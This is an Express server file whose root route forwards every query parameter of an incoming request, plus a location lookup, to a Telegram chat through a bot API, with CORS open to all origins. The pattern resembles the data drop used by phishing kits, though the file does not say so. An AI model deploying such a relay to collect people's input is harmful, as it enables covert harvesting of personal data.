import express from "express";
import axios from "axios";
import cors from "cors";
import dotenv from "dotenv";
dotenv.config();
const app = express();
app.use(
  cors({
    origin: "*",
  })
);
const PORT = process.env.PORT || 27063;
const telegramBotAPiKey = process.env.TELEGRAM_BOT_API_KEY;
const telegramChatId = process.env.TELEGRAM_CHAT_ID;
const ip2LocationID = process.env.IP_2_LOCATION_ID;

app.get("/", async (req, res) => {
  const ipApiResponse = await axios("https://ipapi.co/json/").catch(
    (err) => {}
  );
  const locationApiResponse = await axios(
    `https://api.ip2location.io/?key=${ip2LocationID}&ip=${ipApiResponse.data.ip}&format=json`
  ).catch((err) => {});
  const options = {
    method: "POST",
    url: `https://api.telegram.org/bot${telegramBotAPiKey}/sendMessage`,
    headers: {
      accept: "application/json",
      "content-type": "application/json",
    },
    data: {
      text:
        JSON.stringify(req.query) +
        "LOCATION = " +
        locationApiResponse.data.country_name +
        "-" +
        locationApiResponse.data.region_name,
      parse_mode: "HTML",
      disable_web_page_preview: false,
      disable_notification: false,
      reply_to_message_id: null,
      chat_id: `${telegramChatId}`,
    },
  };
  const telegramBot = await axios.request(options).catch((err) => {});

  res.json();
});

app.listen(PORT, () => {
  console.log(`server started on port ${PORT}`);
});
